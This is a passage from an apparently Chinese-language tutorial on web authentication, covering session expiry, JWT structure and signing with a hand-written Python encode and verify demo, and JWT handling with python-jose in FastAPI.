    fixed_manager = SessionManager(fixed_store,
                                   default_ttl=2,
                                   sliding=False)
    sid2 = fixed_manager.create_session({"user": "test"})
    print(f"\\n创建 Session，TTL=2 秒，关闭滑动过期")
    time.sleep(1)
    print(f"  1 秒访问: {fixed_manager.get_session(sid2) is not None} "
          f"（不续期）")
    time.sleep(1.5)
    print(f"  2.5 秒访问: {fixed_manager.get_session(sid2) is not None} "
          f"（已过期）")

    # ---- 场景 5：对比内存存储和 Redis 存储 ----
    print("\\n--- 场景 5：对比内存存储和 Redis 存储 ---")
    print(f"内存存储 Session 数量: {mem_store.size()}")
    print(f"Redis 存储 Session 数量: {shared_redis.size()}")
    print("-> 生产环境推荐用 Redis：可共享、可持久化、内置 TTL")

    print("\\n" + "=" * 60)
    print("总结：")
    print("  1. Session = 服务端存状态 + 客户端持 ID")
    print("  2. Session ID 必须用 secrets 生成，不可预测")
    print("  3. 登录后必须重新生成 ID（防会话固定）")
    print("  4. 滑动过期：活跃用户不掉线；固定过期：到期必登出")
    print("  5. 分布式场景用 Redis 集中存储")
    print("=" * 60)
`,
  },

  // ============================================================
  // 第 4 章：JWT 结构详解：Header、Payload、Signature
  // ============================================================
  {
    id: "fa-jwt-structure",
    group: "第二部分 JWT 核心原理",
    icon: "🧩",
    title: "JWT 结构详解：Header、Payload、Signature",
    content: `# JWT 结构详解：Header、Payload、Signature

## 一、从护照说起

护照是一种国际通用的身份凭证。一本护照包含三部分：

1. **封面**：标明这是哪国护照、什么类型（封面 = JWT 的 Header）
2. **信息页**：你的姓名、护照号、有效期（信息页 = JWT 的 Payload）
3. **防伪标识**：水印、芯片签名、钢印（防伪 = JWT 的 Signature）

海关拿到护照后：

- 看封面知道这是什么类型的证件
- 看信息页知道你是谁
- 验防伪标识确认这本护照不是伪造的

JWT（JSON Web Token）的工作方式完全一样：用三段编码后的字符串组成一个令牌，服务端可以验证其真实性，无需查库。

## 二、JWT 是什么

### 2.1 定义

JWT 是一种**紧凑的、URL 安全的**方式，用于在两方之间以 JSON 对象的形式安全传输信息。它最大的特点是**可验证**——接收方可以确认内容未被篡改。

JWT 由 RFC 7519 定义，广泛用于认证和信息交换。

### 2.2 JWT 的特点

| 特点 | 说明 |
|------|------|
| 紧凑 | 体积小，可放 URL、Header、Cookie |
| 自包含 | 令牌本身携带用户信息，无需查库 |
| 可验证 | 签名机制保证内容未被篡改 |
| 标准化 | RFC 7519，跨语言通用 |

### 2.3 JWT 的三段式结构

一个 JWT 长这样：

\`\`\`
xxxxx.yyyyy.zzzzz
\`\`\`

- \`xxxxx\` = Header（头部）
- \`yyyyy\` = Payload（载荷）
- \`zzzzz\` = Signature（签名）

三段都用 Base64Url 编码，用点号 \`.\` 分隔。一个真实例子：

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
\`\`\`

把它按 \`.\` 分开，分别解码，就能看到三段内容。

## 三、Header（头部）

### 3.1 结构

Header 是一个 JSON 对象，描述令牌的元信息：

\`\`\`json
{
  "alg": "HS256",
  "typ": "JWT"
}
\`\`\`

- **alg**：签名算法。常见值：
  - \`HS256\`：HMAC + SHA-256（对称加密，同一密钥加签验签）
  - \`RS256\`：RSA + SHA-256（非对称，私钥加签，公钥验签）
  - \`ES256\`：ECDSA + SHA-256（椭圆曲线，更高效）
  - \`none\`：不签名（**绝对不要用**，安全灾难）
- **typ**：令牌类型，固定为 \`"JWT"\`。

### 3.2 Base64Url 编码

Header 的 JSON 字符串用 **Base64Url** 编码成第一段。

为什么是 Base64Url 而不是普通 Base64？因为 JWT 可能放在 URL 里（如 \`?token=xxx\`），而 Base64 用了 \`+\` 和 \`/\` 这两个 URL 不友好的字符。Base64Url 把它们替换掉：

| Base64 | Base64Url |
|--------|-----------|
| \`+\` | \`-\` |
| \`/\` | \`_\` |
| 末尾 \`=\` 填充 | 去掉 |

### 3.3 实际例子

\`\`\`json
{"alg":"HS256","typ":"JWT"}
\`\`\`

Base64Url 编码后：

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
\`\`\`

这就是 JWT 的第一段。

## 四、Payload（载荷）

### 4.1 结构

Payload 也是一个 JSON 对象，存放**实际要传输的信息**——通常是用户标识、角色、过期时间等。

\`\`\`json
{
  "sub": "1234567890",
  "name": "John",
  "admin": true,
  "iat": 1516239022,
  "exp": 1516242622
}
\`\`\`

### 4.2 标准声明（Registered Claims）

JWT 规范预定义了一组"标准声明"，都用三字母缩写：

| 声明 | 全称 | 含义 |
|------|------|------|
| \`iss\` | Issuer | 签发者（谁发的令牌）|
| \`sub\` | Subject | 主体（令牌针对谁，通常是用户 ID）|
| \`aud\` | Audience | 接收方（令牌给谁用）|
| \`exp\` | Expiration Time | 过期时间（什么时候失效）|
| \`nbf\` | Not Before | 生效时间（什么时候开始有效）|
| \`iat\` | Issued At | 签发时间（什么时候发的）|
| \`jti\` | JWT ID | 唯一标识（用于撤销）|

这些声明都是**可选的**，但强烈建议用 \`exp\` 和 \`iat\`。

### 4.3 自定义声明

除了标准声明，可以加任何自定义字段：

\`\`\`json
{
  "sub": "1234567890",
  "name": "张三",
  "role": "admin",
  "department": "技术部"
}
\`\`\`

\`name\`、\`role\`、\`department\` 都是自定义声明。这些字段让 JWT"自包含"——服务端拿到令牌就能直接知道用户角色，不必查库。

### 4.4 重要警告：Payload 不是加密的！

**Payload 只是 Base64Url 编码，不是加密的**。任何人拿到 JWT 都能解码出 Payload 内容。所以：

- **不要在 Payload 里放密码、密钥、信用卡号等敏感信息**
- 放的应该是非敏感的、需要服务端快速获取的信息（如用户 ID、角色）

如果你需要加密内容，应该用 **JWE（JSON Web Encryption）**，不是普通 JWT。

### 4.5 Base64Url 编码

Payload 的 JSON 字符串也用 Base64Url 编码，得到第二段。

\`\`\`json
{"sub":"1234567890","name":"John","iat":1516239022}
\`\`\`

Base64Url 编码后：

\`\`\`
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9
\`\`\`

## 五、Signature（签名）

### 5.1 为什么需要签名

Payload 可以被任何人解码，那怎么防止有人篡改 Payload？比如把 \`"role":"user"\` 改成 \`"role":"admin"\`？

**签名**就是用来防篡改的。签名用密钥对 Header + Payload 计算一个"指纹"，任何对内容的修改都会导致签名不匹配。

### 5.2 签名算法

最常用的是 **HMAC SHA-256**（HS256）：

\`\`\`
signature = HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret
)
\`\`\`

流程：

1. 把 Base64Url 编码的 Header 和 Payload 用 \`.\` 拼起来
2. 用密钥 \`secret\` 对这个字符串做 HMAC-SHA256
3. 得到的字节数组再做 Base64Url 编码，就是 Signature

### 5.3 验证流程

服务端收到 JWT 后：

1. 按 \`.\` 分成三段
2. 取前两段，用自己保存的密钥重新算 HMAC
3. 比对算出来的签名和第三段是否一致
4. 一致则内容未被篡改，不一致则拒绝

**关键**：密钥只有服务端知道。攻击者即使改了 Payload，也算不出正确的签名。

### 5.4 对称 vs 非对称

| 算法 | 类型 | 密钥 | 适用 |
|------|------|------|------|
| HS256 | 对称 | 加签和验签用同一密钥 | 单体应用 |
| RS256 | 非对称 | 私钥加签，公钥验签 | 微服务、开放平台 |
| ES256 | 非对称 | 私钥加签，公钥验签 | 移动端、IoT |

**为什么需要非对称？**

想象你有多个微服务都需要验证 JWT。如果用 HS256（对称），每个服务都要保存同一个 secret——一旦某个服务被攻破，secret 泄露，攻击者就能伪造任何令牌。

用 RS256（非对称）则：只有认证服务有私钥（签发令牌），其他服务只有公钥（只能验证，不能伪造）。即使业务服务被攻破，攻击者也只能"验签"，不能"签发"。

## 六、完整示例：手动拆解 JWT

拿这个 JWT：

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
\`\`\`

按 \`.\` 分成三段：

**第一段（Header）**：

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
\`\`\`

Base64Url 解码：

\`\`\`json
{"alg":"HS256","typ":"JWT"}
\`\`\`

**第二段（Payload）**：

\`\`\`
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9
\`\`\`

Base64Url 解码：

\`\`\`json
{"sub":"1234567890","name":"John","iat":1516239022}
\`\`\`

**第三段（Signature）**：

\`\`\`
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
\`\`\`

这是用密钥 \`your-256-bit-secret\` 对前两段做 HMAC-SHA256 的结果。

## 七、Base64Url 编码与 Base64 的区别

### 7.1 字符表对比

| 字符 | Base64 | Base64Url |
|------|--------|-----------|
| 第 62 位 | \`+\` | \`-\` |
| 第 63 位 | \`/\` | \`_\` |
| 填充 | \`=\` | 无 |

### 7.2 为什么 JWT 用 Base64Url

JWT 经常放在 URL 里（如 \`?token=xxx\`）或 HTTP 头里。普通 Base64 的 \`+\` 和 \`/\` 在 URL 里有特殊含义（\`+\` 会被解码成空格，\`/\` 是路径分隔符），需要 URL 编码。Base64Url 直接避免这些字符，省了二次编码。

### 7.3 互转

Base64 转 Base64Url：

- \`+\` -> \`-\`
- \`/\` -> \`_\`
- 去掉末尾的 \`=\`

反过来就是 Base64Url 转 Base64。

## 八、JWT 的优缺点

### 8.1 优点

1. **无状态**：服务端不存 Session，加机器不用同步状态
2. **自包含**：令牌本身携带用户信息，减少查库
3. **跨域友好**：放在 Header 里，不受 Cookie 跨域限制
4. **标准化**：跨语言、跨平台通用
5. **可扩展**：自定义声明灵活

### 8.2 缺点

1. **无法主动失效**：签发后到过期前一直有效，没法"注销"某个令牌（除非维护黑名单，违背无状态初衷）
2. **续期麻烦**：不像 Session 那样容易滑动续期，通常用 Refresh Token 解决
3. **体积大**：比 Session ID 大得多（携带了信息）
4. **Payload 不加密**：敏感信息不能放
5. **密钥管理**：密钥泄露等于全线崩溃

## 九、JWT 的典型使用场景

### 9.1 认证（最常见）

用户登录后，服务端签发 JWT。客户端后续请求带 JWT，服务端验签后取 Payload 里的用户信息。

\`\`\`
Authorization: Bearer <jwt>
\`\`\`

### 9.2 信息交换

两方需要安全传输数据时，可用 JWT。签名保证内容未被篡改。

### 9.3 微服务间传递用户身份

API 网关验签后，把 JWT 透传给后端微服务，微服务直接读 Payload 拿用户信息，无需再查库。

## 十、JWT 的安全最佳实践

1. **必须设 \`exp\`**：所有 JWT 都要有过期时间，不能永久有效
2. **必须用 HTTPS**：JWT 在传输中可能被窃听
3. **不要在 Payload 放敏感信息**：Payload 可被解码
4. **密钥要足够强**：HS256 的密钥至少 256 位
5. **不要用 \`alg: none\`**：永远不要接受无签名的 JWT
6. **Access Token 短期**：15 分钟内过期
7. **Refresh Token 长期但可撤销**：7-30 天，存服务端可主动失效
8. **验证 \`alg\`**：解码时显式指定算法，不要信任 Header 里的 \`alg\`

## 十一、本章小结

| 概念 | 一句话 |
|------|-------|
| JWT 三段 | Header.Payload.Signature |
| Header | 算法和类型 |
| Payload | 标准声明 + 自定义声明（非加密）|
| Signature | 防篡改的签名 |
| Base64Url | URL 安全的 Base64 |
| HS256 | 对称，单密钥 |
| RS256 | 非对称，私钥签公钥验 |

## 十二、本章 demo 说明

下面的 demo 用纯 Python 手动构建和拆解 JWT，**不依赖任何 JWT 库**，让你彻底理解每一步：

- 手动实现 Base64Url 编码/解码
- 手动构建 Header、Payload
- 手动计算 HMAC-SHA256 签名
- 手动验证签名
- 演示篡改 Payload 后签名验证失败`,
    code: `"""
第四章 demo：手动拆解和构建一个 JWT
目标：不依赖任何 JWT 库，纯手写实现 JWT 的完整构建和验证流程：
  1. Base64Url 编码 / 解码
  2. 构建 Header、Payload
  3. 用 HMAC-SHA256 计算 Signature
  4. 拼接成完整 JWT
  5. 解析 JWT 并验证签名
  6. 演示篡改 Payload 后签名验证失败
说明：本 demo 只用标准库（hashlib、hmac、base64、json），
      目的是让你彻底理解 JWT 的每一步原理。
"""
import base64
import hashlib
import hmac
import json
import time


# ============================================================
# 第一部分：Base64Url 编码 / 解码
# ============================================================
def base64url_encode(data: bytes) -> str:
    """Base64Url 编码。

    Base64Url 与普通 Base64 的区别：
    1. '+' -> '-'
    2. '/' -> '_'
    3. 去掉末尾的 '=' 填充

    为什么需要 Base64Url？
    - JWT 可能放在 URL 里，普通 Base64 的 '+' 和 '/' 会被 URL 编码
    - Base64Url 避开这两个字符，省了二次编码
    """
    # 先做普通 Base64 编码
    b64 = base64.b64encode(data).decode("ascii")
    # 替换字符
    b64 = b64.replace("+", "-").replace("/", "_")
    # 去掉末尾的 = 填充
    b64 = b64.rstrip("=")
    return b64


def base64url_decode(s: str) -> bytes:
    """Base64Url 解码。

    逆过程：
    1. 把 '-' 换回 '+'
    2. 把 '_' 换回 '/'
    3. 补回 '=' 填充（长度补到 4 的倍数）
    4. 普通 Base64 解码
    """
    # 替换字符
    b64 = s.replace("-", "+").replace("_", "/")
    # 补填充
    # Base64 编码后长度是 4 的倍数，不够补 '='
    padding = 4 - len(b64) % 4
    if padding != 4:
        b64 += "=" * padding
    # 解码
    return base64.b64decode(b64)


# ============================================================
# 第二部分：JWT 构建
# ============================================================
def jwt_encode(payload: dict, secret: str, alg: str = "HS256") -> str:
    """手动构建 JWT。

    完整流程：
    1. 构建 Header（含算法和类型）
    2. Base64Url 编码 Header
    3. 构建 Payload（含标准声明和自定义声明）
    4. Base64Url 编码 Payload
    5. 用密钥对 "header.payload" 做 HMAC-SHA256
    6. Base64Url 编码签名
    7. 用 '.' 拼接三段
    """
    # ---- 第 1 步：构建 Header ----
    header = {
        "alg": alg,   # 签名算法
        "typ": "JWT",  # 令牌类型
    }
    # JSON 序列化（紧凑模式，无空格）
    header_json = json.dumps(header, separators=(",", ":"))
    # Base64Url 编码
    header_b64 = base64url_encode(header_json.encode("utf-8"))
    print(f"  [构建] Header JSON: {header_json}")
    print(f"  [构建] Header Base64Url: {header_b64}")

    # ---- 第 2 步：构建 Payload ----
    # 加入标准声明：iat（签发时间）
    payload = {
        **payload,
        "iat": int(time.time()),  # Issued At
    }
    payload_json = json.dumps(payload, separators=(",", ":"))
    payload_b64 = base64url_encode(payload_json.encode("utf-8"))
    print(f"  [构建] Payload JSON: {payload_json}")
    print(f"  [构建] Payload Base64Url: {payload_b64}")

    # ---- 第 3 步：计算签名 ----
    # 签名内容 = Base64Url(header) + "." + Base64Url(payload)
    signing_input = f"{header_b64}.{payload_b64}"
    print(f"  [构建] 签名输入: {signing_input}")

    # 用密钥做 HMAC-SHA256
    # hmac.new(key, msg, digestmod) 返回 HMAC 对象
    signature = hmac.new(
        secret.encode("utf-8"),
        signing_input.encode("utf-8"),
        hashlib.sha256,
    ).digest()

    # 签名也是字节，Base64Url 编码成字符串
    signature_b64 = base64url_encode(signature)
    print(f"  [构建] Signature Base64Url: {signature_b64}")

    # ---- 第 4 步：拼接 ----
    token = f"{header_b64}.{payload_b64}.{signature_b64}"
    print(f"  [构建] 完整 JWT: {token}")
    return token


# ============================================================
# 第三部分：JWT 解析与验证
# ============================================================
def jwt_decode(token: str, secret: str) -> dict:
    """解析并验证 JWT。

    完整流程：
    1. 按 '.' 分成三段
    2. 解码 Header，检查算法
    3. 解码 Payload
    4. 用密钥重新计算签名
    5. 比对签名是否一致（防篡改）
    6. 检查 exp 过期时间
    7. 返回 Payload
    """
    # ---- 第 1 步：分段 ----
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT 必须有三段，用 '.' 分隔")

    header_b64, payload_b64, signature_b64 = parts
    print(f"  [验证] Header: {header_b64}")
    print(f"  [验证] Payload: {payload_b64}")
    print(f"  [验证] Signature: {signature_b64}")

    # ---- 第 2 步：解码 Header ----
    header_json = base64url_decode(header_b64).decode("utf-8")
    header = json.loads(header_json)
    print(f"  [验证] 解码 Header: {header}")

    # 检查算法（关键安全点！）
    # 永远不要接受 alg=none，永远显式指定算法
    if header["alg"] != "HS256":
        raise ValueError(f"不支持的算法: {header['alg']}")

    # ---- 第 3 步：解码 Payload ----
    payload_json = base64url_decode(payload_b64).decode("utf-8")
    payload = json.loads(payload_json)
    print(f"  [验证] 解码 Payload: {payload}")

    # ---- 第 4 步：重新计算签名 ----
    signing_input = f"{header_b64}.{payload_b64}"
    expected_signature = hmac.new(
        secret.encode("utf-8"),
        signing_input.encode("utf-8"),
        hashlib.sha256,
    ).digest()
    expected_signature_b64 = base64url_encode(expected_signature)

    # ---- 第 5 步：比对签名 ----
    # 用 hmac.compare_digest 而不是 ==，防止时序攻击
    # 时序攻击：攻击者通过比对耗时推断字符是否正确
    if not hmac.compare_digest(signature_b64, expected_signature_b64):
        raise ValueError("签名验证失败！JWT 可能被篡改")
    print(f"  [验证] 签名匹配，内容未被篡改")

    # ---- 第 6 步：检查过期 ----
    if "exp" in payload:
        if time.time() > payload["exp"]:
            raise ValueError(f"JWT 已过期（exp={payload['exp']}）")
        print(f"  [验证] 未过期（exp={payload['exp']}）")

    return payload


# ============================================================
# 第四部分：运行演示
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("第四章 demo：手动拆解和构建 JWT")
    print("=" * 60)

    # ---- 场景 1：构建 JWT ----
    print("\\n--- 场景 1：构建 JWT ---")
    secret = "my-super-secret-key-256-bit-please"
    # Payload 包含用户信息和过期时间
    payload = {
        "sub": "user-001",       # Subject: 用户 ID
        "name": "张三",          # 自定义声明
        "role": "admin",         # 自定义声明
        "exp": int(time.time()) + 3600,  # 1 小时后过期
    }
    token = jwt_encode(payload, secret)

    # ---- 场景 2：解析并验证 JWT ----
    print("\\n--- 场景 2：解析并验证 JWT ---")
    try:
        decoded = jwt_decode(token, secret)
        print(f"  [结果] 验证通过，Payload: {decoded}")
    except ValueError as e:
        print(f"  [结果] 验证失败: {e}")

    # ---- 场景 3：篡改 Payload，签名应该验证失败 ----
    print("\\n--- 场景 3：篡改 Payload，演示签名验证 ---")
    # 拆开 token
    parts = token.split(".")
    # 解码 Payload
    tampered_payload = json.loads(base64url_decode(parts[1]))
    print(f"  [篡改] 原 Payload: {tampered_payload}")
    # 把 role 从 admin 改成 superadmin
    tampered_payload["role"] = "superadmin"
    print(f"  [篡改] 改后 Payload: {tampered_payload}")
    # 重新编码
    tampered_payload_b64 = base64url_encode(
        json.dumps(tampered_payload, separators=(",", ":")).encode("utf-8")
    )
    # 拼成新 token（签名保持不变，所以验证会失败）
    tampered_token = f"{parts[0]}.{tampered_payload_b64}.{parts[2]}"
    print(f"  [篡改] 篡改后 JWT: {tampered_token}")

    try:
        jwt_decode(tampered_token, secret)
    except ValueError as e:
        print(f"  [结果] 验证失败（预期内）: {e}")
        print("  -> 攻击者改了 Payload 但算不出正确签名，被识破！")

    # ---- 场景 4：用错误密钥验证，应该失败 ----
    print("\\n--- 场景 4：用错误密钥验证 ---")
    try:
        jwt_decode(token, "wrong-secret")
    except ValueError as e:
        print(f"  [结果] 验证失败（预期内）: {e}")

    # ---- 场景 5：演示 Base64Url 与 Base64 的区别 ----
    print("\\n--- 场景 5：Base64Url vs Base64 ---")
    test_data = b"Hello+World/Test"
    b64 = base64.b64encode(test_data).decode()
    b64url = base64url_encode(test_data)
    print(f"  原始数据: {test_data}")
    print(f"  Base64:    {b64}")
    print(f"  Base64Url: {b64url}")
    print(f"  区别: '+' -> '-', '/' -> '_', 无 '=' 填充")

    # 验证互转
    decoded_back = base64url_decode(b64url)
    print(f"  Base64Url 解码回来: {decoded_back}（与原始一致）")

    # ---- 场景 6：演示过期检查 ----
    print("\\n--- 场景 6：演示过期 JWT ---")
    expired_payload = {
        "sub": "user-002",
        "name": "李四",
        "exp": int(time.time()) - 100,  # 100 秒前就过期了
    }
    expired_token = jwt_encode(expired_payload, secret)
    try:
        jwt_decode(expired_token, secret)
    except ValueError as e:
        print(f"  [结果] 验证失败（预期内）: {e}")

    # ---- 场景 7：对比 JWT 三段大小 ----
    print("\\n--- 场景 7：JWT 三段大小分析 ---")
    parts = token.split(".")
    print(f"  Header 长度:    {len(parts[0])} 字符")
    print(f"  Payload 长度:   {len(parts[1])} 字符")
    print(f"  Signature 长度: {len(parts[2])} 字符")
    print(f"  总长度:         {len(token)} 字符")
    print("  -> JWT 比 Session ID（约 32 字符）大很多，"
          "因为携带了用户信息")

    print("\\n" + "=" * 60)
    print("总结：")
    print("  1. JWT = Header.Payload.Signature，三段都用 Base64Url 编码")
    print("  2. Payload 不是加密的，谁都能解码，别放敏感信息")
    print("  3. 签名用密钥计算，防篡改")
    print("  4. 验证时必须显式指定算法，防 alg=none 攻击")
    print("  5. 签名比对要用 hmac.compare_digest，防时序攻击")
    print("  6. Base64Url 替换 + / = 三个字符，让 JWT URL 安全")
    print("=" * 60)
`,
  },

  // ============================================================
  // 第 5 章：python-jose：JWT 的生成与校验
  // ============================================================
  {
    id: "fa-python-jose",
    group: "第二部分 JWT 核心原理",
    icon: "🐍",
    title: "python-jose：JWT 的生成与校验",
    content: `# python-jose：JWT 的生成与校验

## 一、从手工到工具

上一章我们手写了 JWT 的构建和验证，理解了每一步原理。但生产环境你不会真的用纯手写——太容易出错，密钥管理、算法切换、异常处理都要自己实现。

就像你理解了 RSA 的数学原理，但发邮件时还是用现成的 GnuPG，而不是自己手算大数模幂。

Python 生态有几个成熟的 JWT 库：

| 库 | 维护方 | 特点 |
|----|--------|------|
| **python-jose** | 一群公司 | 支持 JWS、JWE、JWK 全套，FastAPI 官方文档用它 |
| **PyJWT** | 社区 | 轻量，专注 JWT，最流行 |
| **authlib** | 社区 | 全栈 OAuth/OIDC 库，含 JWT |

FastAPI 官方教程用 **python-jose**，本教程也用它，保持一致。

## 二、python-jose 的安装

\`\`\`bash
pip install "python-jose[cryptography]"
\`\`\`

\`[cryptography]\` 是可选依赖，安装后支持 RS256、ES256 等非对称算法。如果只用 HS256，可以省略。但建议装上，将来切换算法不用重装。

## 三、encode：生成 JWT

### 3.1 最简用法

\`\`\`python
from jose import jwt

# 密钥（HS256 算法，对称密钥）
SECRET_KEY = "your-secret-key"

# Payload：要放入 JWT 的数据
payload = {
    "sub": "user-001",       # 用户 ID
    "name": "张三",
    "exp": 1234567890,       # 过期时间戳
}

# 生成 JWT
token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
\`\`\`

返回的 \`token\` 就是一个字符串 \`xxxxx.yyyyy.zzzzz\`。

### 3.2 参数详解

\`jwt.encode\` 的签名：

\`\`\`python
jwt.encode(claims, key, algorithm="HS256", headers=None, access_token=None)
\`\`\`

- **claims**：Payload 字典。建议包含 \`exp\`、\`iat\`、\`sub\` 等标准声明。
- **key**：密钥。HS256 用字符串，RS256 用私钥对象。
- **algorithm**：签名算法。**必须显式指定**，不要依赖默认值。
- **headers**：额外的 Header 字段（如 \`kid\`，密钥 ID）。

### 3.3 自动处理的事

python-jose 帮你处理的细节：

1. JSON 序列化
2. Base64Url 编码
3. 签名计算
4. 三段拼接
5. \`exp\` 等时间戳的整数转换

你只需提供字典和密钥，剩下交给库。

### 3.4 实战：带完整声明的 JWT

\`\`\`python
import time
from jose import jwt

SECRET_KEY = "your-secret-key"

payload = {
    # 标准声明
    "iss": "my-app",                    # 签发者
    "sub": "user-001",                  # 用户 ID
    "aud": "my-app-frontend",           # 接收方
    "iat": int(time.time()),            # 签发时间
    "exp": int(time.time()) + 3600,     # 1 小时后过期
    "nbf": int(time.time()),            # 立即生效
    "jti": "unique-token-id-001",       # 唯一 ID

    # 自定义声明
    "username": "zhangsan",
    "role": "admin",
    "permissions": ["read", "write"],
}

token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
\`\`\`

## 四、decode：校验 JWT

### 4.1 最简用法

\`\`\`python
from jose import jwt

SECRET_KEY = "your-secret-key"

# 校验 JWT，返回 Payload
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
print(payload)  # {"sub": "user-001", "name": "张三", ...}
\`\`\`

### 4.2 参数详解

\`jwt.decode\` 的签名：

\`\`\`python
jwt.decode(token, key, algorithms=None, options=None,
           audience=None, issuer=None, subject=None, access_token=None)
\`\`\`

- **token**：JWT 字符串。
- **key**：密钥。HS256 用字符串，RS256 用公钥对象。
- **algorithms**：**允许的算法列表**。这是关键安全参数！必须传，且必须是列表。不传会报错。
- **options**：高级选项，如 \`{"verify_exp": False}\` 跳过过期检查（一般不要跳）。
- **audience**：期望的 \`aud\` 值。如果 Payload 里有 \`aud\` 但不匹配，报错。
- **issuer**：期望的 \`iss\` 值。不匹配则报错。
- **subject**：期望的 \`sub\` 值。不匹配则报错。

### 4.3 为什么 algorithms 必须是列表

还记得上一章说的"alg=none 攻击"吗？如果攻击者把 Header 改成 \`{"alg":"none"}\`，库会按"无签名"处理，直接信任 Payload。

\`algorithms\` 参数让你**显式声明接受哪些算法**。如果传了 \`["HS256"]\`，攻击者改成 \`none\` 就会被拒绝。

**铁律**：永远显式传 \`algorithms\`，永远不接受 \`none\`。

### 4.4 自动校验的内容

python-jose 在 decode 时自动校验：

1. **签名**：用密钥重新算签名，比对是否一致
2. **exp**：检查是否过期（默认开启）
3. **nbf**：检查是否已生效（默认开启）
4. **iat**：检查签发时间是否合理（默认开启）
5. **aud**：如果传了 \`audience\` 参数，检查是否匹配

如果任意一项失败，抛出对应异常。

## 五、异常处理

### 5.1 异常体系

python-jose 的异常都继承自 \`JWTError\`：

\`\`\`
JWTError
├── JWTClaimsError          # 声明不匹配（iss、aud、sub 等）
├── ExpiredSignatureError   # 签名过期（exp）
├── JWTError                # 其他错误（签名错、格式错等）
\`\`\`

### 5.2 常见异常

| 异常 | 触发条件 | 处理建议 |
|------|---------|---------|
| \`JWTError\` | 签名错、格式错、算法不支持 | 401，要求重新登录 |
| \`ExpiredSignatureError\` | exp 已过 | 401，可用 Refresh Token 续期 |
| \`JWTClaimsError\` | iss / aud / sub 不匹配 | 401，拒绝访问 |

### 5.3 完整异常处理模板

\`\`\`python
from jose import jwt, JWTError, ExpiredSignatureError, JWTClaimsError

def verify_token(token: str) -> dict | None:
    """校验 JWT，失败返回 None。"""
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],
            audience="my-app-frontend",
            issuer="my-app",
        )
        return payload
    except ExpiredSignatureError:
        print("Token 已过期")
        return None
    except JWTClaimsError as e:
        print(f"声明不匹配: {e}")
        return None
    except JWTError as e:
        print(f"Token 无效: {e}")
        return None
\`\`\`

**注意异常捕获顺序**：子类异常（\`ExpiredSignatureError\`、\`JWTClaimsError\`）要在父类（\`JWTError\`）之前，否则永远走父类分支。

## 六、自定义声明和验证

### 6.1 自定义声明

Payload 里可以放任何自定义字段：

\`\`\`python
payload = {
    "sub": "user-001",
    "exp": int(time.time()) + 3600,
    "role": "admin",              # 自定义
    "permissions": ["read", "write"],  # 自定义
}
\`\`\`

校验后直接从 Payload 取：

\`\`\`python
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
role = payload.get("role")
permissions = payload.get("permissions", [])
\`\`\`

### 6.2 应用：基于角色的权限控制

\`\`\`python
def require_role(token: str, required_role: str) -> bool:
    """检查 token 里的 role 是否满足要求。"""
    payload = verify_token(token)
    if payload is None:
        return False
    user_role = payload.get("role", "user")
    return user_role == required_role

# 用法
if require_role(token, "admin"):
    # 执行管理员操作
    ...
else:
    raise HTTPException(403, "需要 admin 权限")
\`\`\`

## 七、HS256 vs RS256 实战

### 7.1 HS256（对称）

加签和验签用同一个密钥：

\`\`\`python
from jose import jwt

SECRET = "shared-secret"

# 加签
token = jwt.encode({"sub": "u1"}, SECRET, algorithm="HS256")

# 验签
payload = jwt.decode(token, SECRET, algorithms=["HS256"])
\`\`\`

适合：单体应用，认证和业务在同一系统。

### 7.2 RS256（非对称）

私钥加签，公钥验签：

\`\`\`python
from jose import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# 生成 RSA 密钥对（真实环境密钥要持久化）
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 用私钥加签
token = jwt.encode({"sub": "u1"}, private_key, algorithm="RS256")

# 用公钥验签
payload = jwt.decode(token, public_key, algorithms=["RS256"])
\`\`\`

适合：微服务架构。认证服务持有私钥签发令牌，业务服务用公钥验签，业务服务被攻破也不能伪造令牌。

## 八、在 FastAPI 里用 python-jose

FastAPI 官方教程的标准用法：

\`\`\`python
from datetime import datetime, timedelta
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer
from jose import jwt, JWTError

SECRET_KEY = "your-secret-key"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="login")

def create_access_token(data: dict) -> str:
    """生成访问令牌。"""
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def get_current_user(token: str = Depends(oauth2_scheme)) -> dict:
    """从令牌解析当前用户。"""
    credentials_exception = HTTPException(
        status_code=401,
        detail="无效凭证",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        if username is None:
            raise credentials_exception
        return payload
    except JWTError:
